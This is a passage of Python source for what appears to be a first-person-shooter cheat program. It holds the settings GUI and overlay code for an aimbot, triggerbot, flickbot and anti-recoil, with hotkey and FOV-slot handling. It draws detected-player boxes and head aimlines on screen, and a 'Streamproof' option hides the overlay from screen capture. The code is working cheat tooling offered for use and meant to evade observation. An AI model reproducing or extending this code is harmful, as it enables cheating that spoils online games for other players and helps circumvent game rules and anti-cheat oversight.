        threading.Thread(target=self.listen_for_hotkey4).start()
        self.auto_save_config()

    def listen_for_hotkey4(self):
        while self.is_selecting_hotkey4:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Flickbot_Keybind = vk
                    self.is_selecting_hotkey4 = False
                    key_name_converted4 = KEY_NAMES.get(self.Flickbot_Keybind, f"0x{self.Flickbot_Keybind:02X}")
                    self.btn_hotkey4.setText(f"{key_name_converted4}")
                    self.auto_save_config()
                    break

    def start_select_hotkey_slot1(self):
        self.is_selecting_hotkey_slot1 = True
        self.Slot1_Keybind = None
        self.btn_hotkey_slot1.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot1).start()
        self.auto_save_config()

    def listen_for_hotkey_slot1(self):
        while self.is_selecting_hotkey_slot1:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot1_Keybind = vk
                    self.is_selecting_hotkey_slot1 = False
                    key_name_converted_slot1 = KEY_NAMES.get(self.Slot1_Keybind, f"0x{self.Slot1_Keybind:02X}")
                    self.btn_hotkey_slot1.setText(f"{key_name_converted_slot1}")
                    self.auto_save_config()
                    break

    # Slot 2
    def start_select_hotkey_slot2(self):
        self.is_selecting_hotkey_slot2 = True
        self.Slot2_Keybind = None
        self.btn_hotkey_slot2.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot2).start()
        self.auto_save_config()

    def listen_for_hotkey_slot2(self):
        while self.is_selecting_hotkey_slot2:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot2_Keybind = vk
                    self.is_selecting_hotkey_slot2 = False
                    key_name_converted_slot2 = KEY_NAMES.get(self.Slot2_Keybind, f"0x{self.Slot2_Keybind:02X}")
                    self.btn_hotkey_slot2.setText(f"{key_name_converted_slot2}")
                    self.auto_save_config()
                    break

    # Slot 3
    def start_select_hotkey_slot3(self):
        self.is_selecting_hotkey_slot3 = True
        self.Slot3_Keybind = None
        self.btn_hotkey_slot3.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot3).start()
        self.auto_save_config()

    def listen_for_hotkey_slot3(self):
        while self.is_selecting_hotkey_slot3:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot3_Keybind = vk
                    self.is_selecting_hotkey_slot3 = False
                    key_name_converted_slot3 = KEY_NAMES.get(self.Slot3_Keybind, f"0x{self.Slot3_Keybind:02X}")
                    self.btn_hotkey_slot3.setText(f"{key_name_converted_slot3}")
                    self.auto_save_config()
                    break

    # Slot 4
    def start_select_hotkey_slot4(self):
        self.is_selecting_hotkey_slot4 = True
        self.Slot4_Keybind = None
        self.btn_hotkey_slot4.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot4).start()
        self.auto_save_config()

    def listen_for_hotkey_slot4(self):
        while self.is_selecting_hotkey_slot4:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot4_Keybind = vk
                    self.is_selecting_hotkey_slot4 = False
                    key_name_converted_slot4 = KEY_NAMES.get(self.Slot4_Keybind, f"0x{self.Slot4_Keybind:02X}")
                    self.btn_hotkey_slot4.setText(f"{key_name_converted_slot4}")
                    self.auto_save_config()
                    break

    # Slot 5
    def start_select_hotkey_slot5(self):
        self.is_selecting_hotkey_slot5 = True
        self.Slot5_Keybind = None
        self.btn_hotkey_slot5.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot5).start()
        self.auto_save_config()

    def listen_for_hotkey_slot5(self):
        while self.is_selecting_hotkey_slot5:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot5_Keybind = vk
                    self.is_selecting_hotkey_slot5 = False
                    key_name_converted_slot5 = KEY_NAMES.get(self.Slot5_Keybind, f"0x{self.Slot5_Keybind:02X}")
                    self.btn_hotkey_slot5.setText(f"{key_name_converted_slot5}")
                    self.auto_save_config()
                    break

    # Slot 6
    def start_select_hotkey_slot6(self):
        self.is_selecting_hotkey_slot6 = True
        self.Slot6_Keybind = None
        self.btn_hotkey_slot6.setText("...")
        threading.Thread(target=self.listen_for_hotkey_slot6).start()
        self.auto_save_config()

    def listen_for_hotkey_slot6(self):
        while self.is_selecting_hotkey_slot6:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Slot6_Keybind = vk
                    self.is_selecting_hotkey_slot6 = False
                    key_name_converted_slot6 = KEY_NAMES.get(self.Slot6_Keybind, f"0x{self.Slot6_Keybind:02X}")
                    self.btn_hotkey_slot6.setText(f"{key_name_converted_slot6}")
                    self.auto_save_config()
                    break

    def calculate_color(self, hue, opacity, lightness):
        overlay_color = QColor.fromHsl(235, 87, 78)
        overlay_color.setAlpha(100)
        return overlay_color

    def on_slider_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider.setValue(tick_position)
        global Fov_Size
        Fov_Size = tick_position
        self.Fov_Size_label.setText(f'FOV: {str(Fov_Size)}')

    def on_slider0_value_change(self, value):
        self.auto_save_config()
        tick_position0 = round(value / 1) * 1
        self.slider0.setValue(tick_position0)
        global Confidence
        Confidence = tick_position0
        self.Confidence_label.setText(f'Confidence: {str(Confidence)}%')

    def on_slider_fps_value_change(self, value):
        self.auto_save_config()
        tick_position0r = round(value / 1) * 1
        self.slider_fps.setValue(tick_position0r)
        global Model_FPS
        Model_FPS = tick_position0r
        self.fps_label.setText(f'Max FPS: {str(Model_FPS)}')

    def on_slider3_value_change(self, value):
        self.auto_save_config()
        #tick_position3 = round(value)
        tick_position3 = round(value / 5) * 5
        self.slider3.setValue(tick_position3)
        global Aim_Smooth
        Aim_Smooth = tick_position3
        self.Aim_Smooth_label.setText(f'AI Strength: {str(Aim_Smooth)}')

    def on_slider4_value_change(self, value):
        self.auto_save_config()
        tick_position4 = round(value / 1) * 1
        self.slider4.setValue(tick_position4)
        global Max_Detections
        Max_Detections = tick_position4
        self.Max_Detections_label.setText(f'Max Detections: {str(Max_Detections)}')

    def on_slider5_value_change(self, value):
        self.auto_save_config()
        tick_position5 = round(value / 1) * 1
        self.slider5.setValue(tick_position5)
        global Auto_Fire_Fov_Size
        Auto_Fire_Fov_Size = tick_position5
        self.Auto_Fire_Fov_Size_label.setText(f'FOV Size: {str(Auto_Fire_Fov_Size)}')

    def on_slider60_value_change(self, value):
        self.auto_save_config()
        tick_position60 = round(value / 1) * 1
        self.slider60.setValue(tick_position60)
        global AntiRecoil_Strength
        AntiRecoil_Strength = tick_position60
        self.AntiRecoil_Strength_label.setText(f'Strength: {str(AntiRecoil_Strength)}')

    def on_slider_slot1_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider_slot1.setValue(tick_position)
        global Fov_Size_Slot1
        Fov_Size_Slot1 = tick_position
        self.Fov_Size_label_slot1.setText(f'FOV: {str(Fov_Size_Slot1)}')

    def on_slider_slot2_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider_slot2.setValue(tick_position)
        global Fov_Size_Slot2
        Fov_Size_Slot2 = tick_position
        self.Fov_Size_label_slot2.setText(f'FOV: {str(Fov_Size_Slot2)}')

    def on_slider_slot3_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider_slot3.setValue(tick_position)
        global Fov_Size_Slot3
        Fov_Size_Slot3 = tick_position
        self.Fov_Size_label_slot3.setText(f'FOV: {str(Fov_Size_Slot3)}')

    def on_slider_slot4_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider_slot4.setValue(tick_position)
        global Fov_Size_Slot4
        Fov_Size_Slot4 = tick_position
        self.Fov_Size_label_slot4.setText(f'FOV: {str(Fov_Size_Slot4)}')

    def on_slider_slot5_value_change(self, value):
        self.auto_save_config()
        tick_position = round(value / 10) * 10
        self.slider_slot5.setValue(tick_position)
        global Fov_Size_Slot5
        Fov_Size_Slot5 = tick_position
        self.Fov_Size_label_slot5.setText(f'FOV: {str(Fov_Size_Slot5)}')

    def on_flick_scope_slider_value_change(self, value):
        self.auto_save_config()
        tick_position_flick_scope = round(value / 1) * 1
        self.flick_scope_slider.setValue(tick_position_flick_scope)
        global Flick_Scope_Sens
        Flick_Scope_Sens = tick_position_flick_scope
        self.flick_scope_label.setText(f'Flick Strength: {str(Flick_Scope_Sens)}%')

    def on_flick_cool_slider_value_change(self, value):
        self.auto_save_config()
        tick_position_cooldown = round(value / 5) * 5 / 100.0
        self.flick_cool_slider.setValue(int(tick_position_cooldown * 100))
        global Flick_Cooldown
        Flick_Cooldown = tick_position_cooldown
        self.flick_cool_label.setText(f'Cool Down: {str(Flick_Cooldown)}s')

    def on_flick_delay_slider_value_change(self, value):
        self.auto_save_config()
        tick_position_delay = value / 1000.0
        self.flick_delay_slider.setValue(int(tick_position_delay * 1000))
        global Flick_Delay
        Flick_Delay = tick_position_delay
        self.flick_delay_label.setText(f'Shot Delay: {str(Flick_Delay)}s')

    def on_slider6_value_change(self, value):
        self.auto_save_config()
        tick_position6 = round(value / 1) * 1
        self.slider6.setValue(tick_position6)
        global Auto_Fire_Confidence
        Auto_Fire_Confidence = tick_position6
        self.Auto_Fire_Confidence_label.setText(f'Confidence: {str(Auto_Fire_Confidence)}%')

    def toggle_checkbox1(self, state):
        self.auto_save_config()
        # Update the global variable Enable_Aim
        global Enable_Aim
        Enable_Aim = state == Qt.Unchecked

        # Toggle the state of the checkbox
        self.Enable_Aim_checkbox.setChecked(not Enable_Aim)

        QApplication.processEvents()
        self.auto_save_config()

    def on_checkbox_state_change(self, state):
        self.auto_save_config()
        if self.sender() == self.Enable_Aim_checkbox:
            global Enable_Aim
            Enable_Aim = (state == Qt.Checked)
        # if self.sender() == self.Streamproof_checkbox:
        # 	global Streamproof
        # 	Streamproof = (state == Qt.Checked)
        if self.sender() == self.Enable_Aim_Slot1_checkbox:
            global Enable_Aim_Slot1
            Enable_Aim_Slot1 = (state == Qt.Checked)

        if self.sender() == self.Enable_Aim_Slot2_checkbox:
            global Enable_Aim_Slot2
            Enable_Aim_Slot2 = (state == Qt.Checked)

        if self.sender() == self.Enable_Aim_Slot3_checkbox:
            global Enable_Aim_Slot3
            Enable_Aim_Slot3 = (state == Qt.Checked)

        if self.sender() == self.Enable_Aim_Slot4_checkbox:
            global Enable_Aim_Slot4
            Enable_Aim_Slot4 = (state == Qt.Checked)

        if self.sender() == self.Enable_Aim_Slot5_checkbox:
            global Enable_Aim_Slot5
            Enable_Aim_Slot5 = (state == Qt.Checked)

        if self.sender() == self.Enable_Slots_checkbox:
            global Enable_Slots
            Enable_Slots = (state == Qt.Checked)

        if self.sender() == self.Show_Fov_checkbox:
            global Show_Fov
            Show_Fov = (state == Qt.Checked)

        if self.sender() == self.Show_Crosshair_checkbox:
            global Show_Crosshair
            Show_Crosshair = (state == Qt.Checked)

        if self.sender() == self.Show_CMD_checkbox:
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            SW_HIDE = 0
            SW_SHOW = 5	
            user32.ShowWindow(hWnd, SW_HIDE if user32.IsWindowVisible(hWnd) else SW_SHOW)

        if self.sender() == self.Show_Debug_checkbox:
            global Show_Debug
            Show_Debug = (state == Qt.Checked)
            if Show_Debug == False:
                hwnd = win32gui.FindWindow(None, random_caption1)
                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            else:
                hwnd = win32gui.FindWindow(None, random_caption1)
                win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)

        if self.sender() == self.Show_FPS_checkbox:
            global Show_FPS
            Show_FPS = (state == Qt.Checked)

        if self.sender() == self.Enable_TriggerBot_checkbox:
            global Enable_TriggerBot
            Enable_TriggerBot = (state == Qt.Checked)

        if self.sender() == self.Show_Detections_checkbox:
            global Show_Detections
            Show_Detections = (state == Qt.Checked)

        if self.sender() == self.Show_Aimline_checkbox:
            global Show_Aimline
            Show_Aimline = (state == Qt.Checked)

        if self.sender() == self.Require_Keybind_checkbox:
            global Require_Keybind
            Require_Keybind = (state == Qt.Checked)

        if self.sender() == self.Controller_On_checkbox:
            global Controller_On
            Controller_On = (state == Qt.Checked)

        if self.sender() == self.CupMode_On_checkbox:
            global CupMode_On
            CupMode_On = (state == Qt.Checked)

        if self.sender() == self.Reduce_Bloom_checkbox:
            global Reduce_Bloom
            Reduce_Bloom = (state == Qt.Checked)

        if self.sender() == self.Require_ADS_checkbox:
            global Require_ADS
            Require_ADS = (state == Qt.Checked)

        if self.sender() == self.AntiRecoil_On_checkbox:
            global AntiRecoil_On
            AntiRecoil_On = (state == Qt.Checked)

        if self.sender() == self.Enable_Flick_checkbox:
            global Enable_Flick_Bot
            Enable_Flick_Bot = (state == Qt.Checked)

        if self.sender() == self.Use_Hue_checkbox:
            global Use_Hue
            Use_Hue = (state == Qt.Checked)

        if self.sender() == self.Use_Model_Class_checkbox:
            global Use_Model_Class
            Use_Model_Class = (state == Qt.Checked)

        self.auto_save_config()

class HueUpdaterThread(threading.Thread):
    def __init__(self, parent):
        super().__init__()
        self.parent = parent
        self.hue = 0
        self.running = True

    def run(self):
        while self.running:
            # Update hue value
            self.hue = (self.hue + 1) % 360
            time.sleep(0.025)  # Adjust the sleep time for smoother animation

    def stop(self):
        self.running = False

class DetectionBox(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.Tool | Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.WindowTransparentForInput | Qt.WindowDoesNotAcceptFocus)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setAttribute(Qt.WA_TransparentForMouseEvents)
        self.setAttribute(Qt.WA_ShowWithoutActivating)
        self.load_config()
        global Fov_Size
        self.Fov_Size = Fov_Size
        self.setGeometry(int(screen_res_X - self.Fov_Size+2) // 2, int(screen_res_Y - self.Fov_Size+2) // 2, self.Fov_Size+25, self.Fov_Size+25)
        window_handle = int(self.winId())
        user32.SetWindowDisplayAffinity(window_handle, 0x00000011) if Streamproof else user32.SetWindowDisplayAffinity(window_handle, 0x00000000)
        self.detected_players = []

        self.hue_updater = HueUpdaterThread(self)
        self.hue_updater.start()

        self.current_slot_selectedd = 1
        self.update_fov_size()

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update)
        self.timer.start(100)
        self.start_time = time.perf_counter()

        self.key_states = {key: False for key in [Slot1_Keybind, Slot2_Keybind, Slot3_Keybind, Slot4_Keybind, Slot5_Keybind, Slot6_Keybind] if key is not None}

        self.key_check_timer = QTimer(self)
        self.key_check_timer.timeout.connect(self.check_key_states)
        self.key_check_timer.start(10)

    def update_detected_players(self, detected_players):
        self.detected_players = detected_players
        self.update()

    def clear_detected_players(self):
        self.detected_players = []
        self.update()

    def fps(self):
        return int(1.5 / (time.perf_counter() - self.start_time))

    def load_config(self):
        with open('./config.json', 'r') as infile:
            config_settings = jsond.load(infile)

        self.Use_Hue = config_settings['Use_Hue']

        # self.fov_color = QColor(
        # 	config_settings.get("RGBA_Value", {}).get("red", 255),
        # 	config_settings.get("RGBA_Value", {}).get("green", 255),
        # 	config_settings.get("RGBA_Value", {}).get("blue", 255),
        # 	config_settings.get("RGBA_Value", {}).get("opacity", 255)
        # )

        self.fov_color = QColor(255,255,255,255)
        self.lightness = config_settings.get("RGBA_Value", {}).get("lightness", 128)  # Add this line

        self.fov_color_outline = QColor(
            0,
            0,
            0,
            config_settings.get("RGBA_Value", {}).get("opacity", 255)
        )

        # self.watermark_color = QColor(
        # 	config_settings.get("RGBA_Value", {}).get("red", 255),
        # 	config_settings.get("RGBA_Value", {}).get("green", 255),
        # 	config_settings.get("RGBA_Value", {}).get("blue", 255),
        # 	config_settings.get("RGBA_Value", {}).get("opacity", 255)
        # )
        self.watermark_color = QColor(151,159,251,255)
        self.watermark_color_outline = QColor(
            0,
            0,
            0,
            0
        )

        self.crosshair_dot_color = QColor(
            config_settings.get("RGBA_Value", {}).get("red", 255),
            config_settings.get("RGBA_Value", {}).get("green", 255),
            config_settings.get("RGBA_Value", {}).get("blue", 255),
            255
        )
        self.crosshair_color = QColor(255, 255, 255, 255)  # Crosshair color with full opacity

        self.fov_thickness = 1.5
        self.watermark_thickness = 0.5
        self.crosshair_thickness = 1.5

    def BlueADS(self):
        return True if win32api.GetKeyState(win32con.VK_RBUTTON) in (-127, -128) else False
        pass

    def BlueFire(self):
        return True if win32api.GetKeyState(win32con.VK_LBUTTON) in (-127, -128) else False
        pass

    def check_key_states(self):
        if Enable_Slots:
            # Check each key and update states
            for key, slot in zip([Slot1_Keybind, Slot2_Keybind, Slot3_Keybind, Slot4_Keybind, Slot5_Keybind, Slot6_Keybind], range(1, 7)):
                if key is not None:
                    # Check if the key is in self.key_states
                    if key not in self.key_states:
                        print(f"[Astro] -> key {key} not found in key_states")
                        self.key_states[key] = False  # Initialize the state if it's missing
                    current_state = win32api.GetAsyncKeyState(key) < 0
                    if current_state and not self.key_states[key]:
                        # Key has been pressed down
                        self.current_slot_selectedd = slot
                        self.update_fov_size()
                    self.key_states[key] = current_state

        if not Enable_Slots:
            self.Fov_Size = Fov_Size

        self.update()

    def update_fov_size(self):
        if Enable_Slots:
            if self.current_slot_selectedd is not None:
                if self.current_slot_selectedd == 1:
                    self.Fov_Size = Fov_Size_Slot1
                elif self.current_slot_selectedd == 2:
                    self.Fov_Size = Fov_Size_Slot2
                elif self.current_slot_selectedd == 3:
                    self.Fov_Size = Fov_Size_Slot3
                elif self.current_slot_selectedd == 4:
                    self.Fov_Size = Fov_Size_Slot4
                elif self.current_slot_selectedd == 5:
                    self.Fov_Size = Fov_Size_Slot5
                elif self.current_slot_selectedd == 6:
                    self.Fov_Size = 15
            else:
                self.Fov_Size = Fov_Size
        if not Enable_Slots:
            self.Fov_Size = Fov_Size

        self.setGeometry(int(screen_res_X-4 - self.Fov_Size+2) // 2, int(screen_res_Y-4 - self.Fov_Size+2) // 2, self.Fov_Size+25, self.Fov_Size+25)
        self.update()

    def paintEvent(self, event):

        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        if not Enable_Slots:
            self.setGeometry(int(screen_res_X-4 - self.Fov_Size+2) // 2, int(screen_res_Y-4 - self.Fov_Size+2) // 2, self.Fov_Size+25, self.Fov_Size+25)
        self.load_config()

        font_size_px = 11
        font = QFont("Verdana")
        font.setPixelSize(font_size_px)
        painter.setFont(font)

        if CupMode_On:
            pass
        elif CupMode_On == False:

            if self.current_slot_selectedd == 6:
                if Enable_Slots:
                    pass
            else:
                if Show_Fov:
                    center_x = self.Fov_Size // 2
                    center_y = self.Fov_Size // 2
                    fov_radius = self.Fov_Size // 2 - self.fov_thickness // 2
                    if Use_Hue:
                        fov_thickness = 1.1
                        num_sections = 360
                        section_angle = 360 / num_sections

                        for i in range(num_sections):
                            hue = (self.hue_updater.hue + i) % 360
                            color = QColor.fromHsv(hue, 175, 255)
                            pen = QPen(color, fov_thickness, Qt.SolidLine)
                            painter.setPen(pen)
                            start_angle = i * section_angle * 16
                            end_angle = (i + 1) * section_angle * 16
                            rect = QRect(int(center_x + 2 - fov_radius), int(center_y + 2 - fov_radius), int(2 * fov_radius), int(2 * fov_radius))
                            painter.drawArc(rect, int(start_angle), int(section_angle * 16))
                    else:
                        fov_rect = QRectF(center_x+2 - fov_radius, center_y+2 - fov_radius, 2 * fov_radius, 2 * fov_radius)
                        painter.setPen(QPen(self.fov_color, self.fov_thickness, Qt.SolidLine))
                        painter.drawEllipse(fov_rect)
                        if Visual_Outlines:
                            inner_radius = fov_radius - 1.0
                            outer_radius = fov_radius + 1.0
                            pen_inner = QPen(self.fov_color_outline, 0.6)
                            pen_outer = QPen(self.fov_color_outline, 0.6)
                            painter.setPen(pen_inner)
                            inner_rect = QRect(int(center_x+2 - inner_radius), int(center_y+2 - inner_radius), int(2 * inner_radius), int(2 * inner_radius))
                            painter.drawEllipse(inner_rect)
                            painter.setPen(pen_outer)
                            outer_rect = QRect(int(center_x+2 - outer_radius), int(center_y+2 - outer_radius), int(2 * outer_radius), int(2 * outer_radius))
                            painter.drawEllipse(outer_rect)

            if Show_Crosshair:
                if self.BlueFire():
                    pen_crosshair_ads = QPen(QColor(255, 255, 255, 255), 0.3, Qt.SolidLine)
                    painter.setPen(pen_crosshair_ads)
                    painter.setRenderHint(QPainter.Antialiasing, False)
                    center_x = self.width() // 2 -11
                    center_y = self.height() // 2 -11
                    painter.drawLine(center_x, center_y + 3, center_x, center_y - 3)
                    painter.drawLine(center_x - 3, center_y, center_x + 3, center_y)
                else:
                    if self.BlueADS():
                        pen_crosshair_ads = QPen(QColor(255, 255, 255, 255), 0.5, Qt.SolidLine)
                        painter.setPen(pen_crosshair_ads)
                        painter.setRenderHint(QPainter.Antialiasing, False)
                        center_x = self.width() // 2 -11
                        center_y = self.height() // 2 -11
                        painter.drawLine(center_x, center_y + 5, center_x, center_y - 5)
                        painter.drawLine(center_x - 5, center_y, center_x + 5, center_y)
                    else:
                        pen_crosshair = QPen(QColor(255, 255, 255, 255), 1.1, Qt.SolidLine)
                        painter.setPen(pen_crosshair)
                        painter.setRenderHint(QPainter.Antialiasing, False)
                        center_x = self.width() // 2 -11
                        center_y = self.height() // 2 -11
                        painter.drawLine(center_x, center_y + 7, center_x, center_y - 7)
                        painter.drawLine(center_x - 7, center_y, center_x + 7, center_y)
                        dot_radius = 1
                        if Use_Hue:
                            hue = self.hue_updater.hue
                            dot_pen = QPen(QColor.fromHsv(hue, 255, 255), dot_radius * 2)
                        else:
                            dot_pen = QPen(self.crosshair_dot_color, dot_radius * 2)
                        painter.setPen(dot_pen)
                        painter.drawPoint(center_x, center_y)
                        pen_crosshair_outline = QPen(Qt.black, 1, Qt.SolidLine)  # Adjust thickness as needed
                        painter.setPen(pen_crosshair_outline)
                        outline_offset = 1
                        painter.drawLine(center_x - outline_offset, center_y + 8, center_x - outline_offset, center_y - 8)
                        painter.drawLine(center_x - 8, center_y - outline_offset, center_x + 8, center_y - outline_offset)
                        painter.drawLine(center_x + outline_offset, center_y + 8, center_x + outline_offset, center_y - 8)
                        painter.drawLine(center_x - 8, center_y + outline_offset, center_x + 8, center_y + outline_offset)
                        painter.drawLine(center_x - outline_offset, center_y - 8, center_x + outline_offset, center_y - 8)
                        painter.drawLine(center_x - outline_offset, center_y + 8, center_x + outline_offset, center_y + 8)
                        painter.drawLine(center_x - 8, center_y - outline_offset, center_x - 8, center_y + outline_offset)
                        painter.drawLine(center_x + 8, center_y - outline_offset, center_x + 8, center_y + outline_offset)
                    self.update()

            if self.current_slot_selectedd == 6:
                if Enable_Slots:
                    pass
            else:
                if Show_Detections:
                    for player in self.detected_players:

                        x1, y1, x2, y2 = player['x1'], player['y1'], player['x2'], player['y2']
                        head1, head2 = player['head1'], player['head2']

                        #self.update_fov_size()

                        width = x2 - x1
                        height = y2 - y1

                        margin_factor = 0.1
                        margin_x = width * margin_factor
                        margin_y = height * margin_factor

                        x1 -= margin_x
                        y1 -= margin_y
                        x2 += margin_x
                        y2 += margin_y
                        width = x2 - x1
                        height = y2 - y1
                        x1, y1, x2, y2 = int(x1), int(y1), int(x2), int(y2)
                        head1, head2 = int(head1), int(head2)

                        if Box_type == "Corner":
                            if Use_Hue:
                                hue = int(time.time() * 150) % 360
                                color = QColor.fromHsv(hue, 255, 255, 255)
                                painter.setPen(QPen(color, 1))
                            else:
                                painter.setPen(QPen(self.fov_color, 1))

                            corner_length = int(min(width, height) * 0.1) 

                            if Visual_Outlines:
                                painter.setPen(QPen(Qt.black, 1))
                                painter.setRenderHint(QPainter.Antialiasing, False)
                                # Top-left corner (outside)
                                painter.drawLine(x1 - 1, y1 - 1, x1 + corner_length + 1, y1 - 1)
                                painter.drawLine(x1 - 1, y1 - 1, x1 - 1, y1 + corner_length + 1)
                                # Top-right corner (outside)
                                painter.drawLine(x2 + 1, y1 - 1, x2 - corner_length - 1, y1 - 1)
                                painter.drawLine(x2 + 1, y1 - 1, x2 + 1, y1 + corner_length + 1)
                                # Bottom-left corner (outside)
                                painter.drawLine(x1 - 1, y2 + 1, x1 + corner_length + 1, y2 + 1)
                                painter.drawLine(x1 - 1, y2 + 1, x1 - 1, y2 - corner_length - 1)
                                # Bottom-right corner (outside)
                                painter.drawLine(x2 + 1, y2 + 1, x2 - corner_length - 1, y2 + 1)
                                painter.drawLine(x2 + 1, y2 + 1, x2 + 1, y2 - corner_length - 1)

                            if Use_Hue:
                                hue = int(time.time() * 150) % 360
                                color = QColor.fromHsv(hue, 255, 255, 255)
                                painter.setPen(QPen(color, 2))
                            else:
                                painter.setPen(QPen(QColor(255,255,255,255), 1))
                            painter.drawLine(x1, y1, x1 + corner_length, y1)
                            painter.drawLine(x1, y1, x1, y1 + corner_length)
                            painter.drawLine(x2, y1, x2 - corner_length, y1)
                            painter.drawLine(x2, y1, x2, y1 + corner_length)
                            painter.drawLine(x1, y2, x1 + corner_length, y2)
                            painter.drawLine(x1, y2, x1, y2 - corner_length)
                            painter.drawLine(x2, y2, x2 - corner_length, y2)
                            painter.drawLine(x2, y2, x2, y2 - corner_length)

                            # if Visual_Outlines:
                            # 	painter.setPen(QPen(Qt.black, 1))
                            # 	painter.setRenderHint(QPainter.Antialiasing, False)
                            # 	# Top-left corner (inside)
                            # 	painter.drawLine(x1 + 1, y1 + 1, x1 + corner_length - 1, y1 + 1)
                            # 	painter.drawLine(x1 + 1, y1 + 1, x1 + 1, y1 + corner_length - 1)
                            # 	# Top-right corner (inside)
                            # 	painter.drawLine(x2 - 1, y1 + 1, x2 - corner_length + 1, y1 + 1)
                            # 	painter.drawLine(x2 - 1, y1 + 1, x2 - 1, y1 + corner_length - 1)
                            # 	# Bottom-left corner (inside)
                            # 	painter.drawLine(x1 + 1, y2 - 1, x1 + corner_length - 1, y2 - 1)
                            # 	painter.drawLine(x1 + 1, y2 - 1, x1 + 1, y2 - corner_length + 1)
                            # 	# Bottom-right corner (inside)
                            # 	painter.drawLine(x2 - 1, y2 - 1, x2 - corner_length + 1, y2 - 1)
                            # 	painter.drawLine(x2 - 1, y2 - 1, x2 - 1, y2 - corner_length + 1)
                        elif Box_type == "Regular":
                            if Use_Hue:
                                hue = int(time.time() * 150) % 360
                                color = QColor.fromHsv(hue, 255, 255, 55)
                                painter.setPen(QPen(color, 2))
                            else:
                                painter.setPen(QPen(self.fov_color, 2))

                            # Draw the rectangle using lines
                            painter.drawLine(x1, y1, x2, y1)  # Top edge
                            painter.drawLine(x2, y1, x2, y2)  # Right edge
                            painter.drawLine(x2, y2, x1, y2)  # Bottom edge
                            painter.drawLine(x1, y2, x1, y1)
                        elif Box_type == "Filled":
                            if Use_Hue:
                                hue = int(time.time() * 150) % 360
                                color = QColor.fromHsv(hue, 255, 255, 55)
                                painter.setPen(QPen(color, 2))
                            else:
                                painter.setPen(QPen(QColor(151, 158, 248, int(255 * 0.75)), 2))

                            fill_color = QColor(151, 158, 248, int(255 * 0.25))
                            painter.setBrush(QBrush(fill_color, Qt.SolidPattern))

                            points = [QPoint(x1, y1), QPoint(x2, y1), QPoint(x2, y2), QPoint(x1, y2)]

                            painter.drawPolygon(QPolygon(points))

                            # # Draw the outline of the rectangle using lines
                            # painter.drawLine(x1, y1, x2, y1)  # Top edge
                            # painter.drawLine(x2, y1, x2, y2)  # Right edge
                            # painter.drawLine(x2, y2, x1, y2)  # Bottom edge
                            # painter.drawLine(x1, y2, x1, y1)
                if Show_Aimline:
                    for player in self.detected_players:
                        head1, head2 = player['head1'], player['head2']  # Extract head1 and head2
                        # self.update_fov_size()
                        center_x, center_y = self.Fov_Size // 2 + 1, self.Fov_Size // 2 + 1

                        # Adjust thickness for smaller outline lines
                        painter.setPen(QPen(self.fov_color, 0.5))  # Use 0.5 for a thinner line
                        painter.drawLine(head1 - 1, head2, center_x - 1, center_y)
                        painter.drawLine(head1 + 1, head2, center_x + 1, center_y)
                        painter.drawLine(head1, head2 - 1, center_x, center_y - 1)
                        painter.drawLine(head1, head2 + 1, center_x, center_y + 1)

                        # Draw the main aim line with the chosen thickness
                        if Use_Hue:
                            painter.setPen(QPen(color, 0.5))  # Adjust this value for thickness
                        else:
                            painter.setPen(QPen(self.fov_color, 0.5))  # Thinner aim line
                        painter.drawLine(head1, head2, center_x, center_y)

                # if Use_Hue:
                # 	bottom_left_text = "0xWTF"
                # 	text_rect = QRect(10, self.height() - 15, self.width() - 15, 16)
                # 	pen_black = QPen(QColor(0, 0, 0, 255), 2.5, Qt.SolidLine)
                # 	painter.setPen(pen_black)
                # 	for dx in [-1, 0, 1]:
                # 		for dy in [-1, 0, 1]:
                # 			painter.drawText(text_rect.translated(dx, dy), Qt.AlignRight | Qt.AlignBottom, bottom_left_text)
                # 	pen_white = QPen(QColor(255, 255, 255), 0.5, Qt.SolidLine)
                # 	painter.setPen(pen_white)
                # 	painter.drawText(text_rect, Qt.AlignRight | Qt.AlignBottom, bottom_left_text)
                # else:
                # 	bottom_left_text = "0xWTF"
                # 	text_rect = QRect(10, self.height()-15, self.width()-15, 16)
                # 	pen_black = QPen(self.watermark_color_outline, 2.5, Qt.SolidLine)
                # 	painter.setPen(pen_black)
                # 	for dx in [-1, 0, 1]:
                # 		for dy in [-1, 0, 1]:
                # 			painter.drawText(text_rect.translated(dx, dy), Qt.AlignRight | Qt.AlignBottom, bottom_left_text)
                # 	painter.setPen(QPen(self.watermark_color, self.watermark_thickness, Qt.SolidLine))
                # 	painter.drawText(text_rect, Qt.AlignRight | Qt.AlignBottom, bottom_left_text)

    def focusInEvent(self, event):
        ctypes.windll.user32.SetFocus(None)

Controller_Toggled = False

class ControllerMode():
    global Controller_Toggled
    def main():
        try:
            pygame.init()
            pygame.joystick.init()

            joystick = pygame.joystick.Joystick(0)
            joystick.init()

            while True:
                global Controller_Toggled
